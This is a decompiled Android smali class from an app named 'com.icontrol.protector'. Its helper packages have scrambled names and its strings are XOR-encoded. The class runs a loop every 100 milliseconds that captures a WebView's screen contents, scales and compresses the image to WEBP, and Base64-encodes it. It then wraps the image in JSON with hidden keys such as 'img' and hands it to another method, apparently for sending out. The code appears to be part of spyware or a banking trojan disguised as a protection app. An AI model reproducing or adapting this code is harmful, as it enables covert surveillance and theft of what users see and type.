.class Lcom/icontrol/protector/WebBrowser$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WebBrowser;->i(Landroid/content/Context;Landroid/webkit/WebView;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Landroid/webkit/WebView;

.field final synthetic g:Lcom/icontrol/protector/WebBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/WebBrowser;Landroid/content/Context;Landroid/webkit/WebView;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WebBrowser$a;->g:Lcom/icontrol/protector/WebBrowser;

    iput-object p2, p0, Lcom/icontrol/protector/WebBrowser$a;->e:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/WebBrowser$a;->f:Landroid/webkit/WebView;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    :cond_0
    const-wide/16 v0, 0x64

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/icontrol/protector/WebBrowser$a$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/WebBrowser$a$a;-><init>(Lcom/icontrol/protector/WebBrowser$a;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :try_start_1
    iget-object v0, p0, Lcom/icontrol/protector/WebBrowser$a;->f:Landroid/webkit/WebView;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/WebBrowser$a;->f:Landroid/webkit/WebView;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/view/View;->getDrawingCache(Z)Landroid/graphics/Bitmap;

    move-result-object v0

    const/16 v3, 0x15e

    const/16 v4, 0x28a

    invoke-static {v0, v3, v4, v2}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v0

    iget-object v3, p0, Lcom/icontrol/protector/WebBrowser$a;->f:Landroid/webkit/WebView;

    invoke-virtual {v3, v2}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    const/4 v3, 0x4

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v6, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v7, 0x32

    invoke-virtual {v0, v6, v7, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    invoke-static {v0, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v6, v5, [B

    fill-array-data v6, :array_3

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x6

    new-array v6, v6, [B

    fill-array-data v6, :array_4

    new-array v7, v5, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x3

    new-array v6, v3, [B

    fill-array-data v6, :array_6

    new-array v7, v5, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v3, [B

    fill-array-data v0, :array_8

    new-array v3, v5, [B

    fill-array-data v3, :array_9

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v1, v1, [B

    const/16 v3, 0x63

    aput-byte v3, v1, v2

    new-array v2, v5, [B

    fill-array-data v2, :array_a

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v4}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/WebBrowser$a;->g:Lcom/icontrol/protector/WebBrowser;

    iget-object v2, p0, Lcom/icontrol/protector/WebBrowser$a;->e:Landroid/content/Context;

    invoke-static {v1, v2, v0}, Lcom/icontrol/protector/WebBrowser;->c(Lcom/icontrol/protector/WebBrowser;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    iget-object v0, p0, Lcom/icontrol/protector/WebBrowser$a;->e:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->V:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :array_0
    .array-data 1
        -0x6bt
        -0x52t
        -0x75t
        0x1dt
    .end array-data

    :array_1
    .array-data 1
        -0x5t
        -0x25t
        -0x19t
        0x71t
        -0x1ct
        0x79t
        -0x28t
        -0x37t
    .end array-data

    :array_2
    .array-data 1
        -0x37t
        0x6ft
        -0x69t
        0x1ft
    .end array-data

    :array_3
    .array-data 1
        -0x43t
        0x16t
        -0x19t
        0x7at
        0x4et
        0xet
        -0x4dt
        0x4ct
    .end array-data

    :array_4
    .array-data 1
        0x59t
        0xct
        -0x6et
        -0x6dt
        -0x63t
        -0x79t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x2et
        0x6et
        -0x10t
        -0x1ft
        -0xet
        -0x10t
        -0x7t
        0x44t
    .end array-data

    :array_6
    .array-data 1
        -0x53t
        -0x5dt
        0x3t
    .end array-data

    :array_7
    .array-data 1
        -0x3ct
        -0x32t
        0x64t
        0x4et
        0x46t
        0x75t
        -0x7bt
        0x3at
    .end array-data

    :array_8
    .array-data 1
        0x28t
        0x1ct
        0x60t
    .end array-data

    :array_9
    .array-data 1
        0x4bt
        0x69t
        0x1at
        -0x62t
        -0x71t
        0x3t
        0x70t
        -0x6ft
    .end array-data

    :array_a
    .array-data 1
        0xdt
        0x1et
        -0x43t
        -0x44t
        -0x1t
        -0x43t
        -0x3dt
        -0x6bt
    .end array-data
.end method
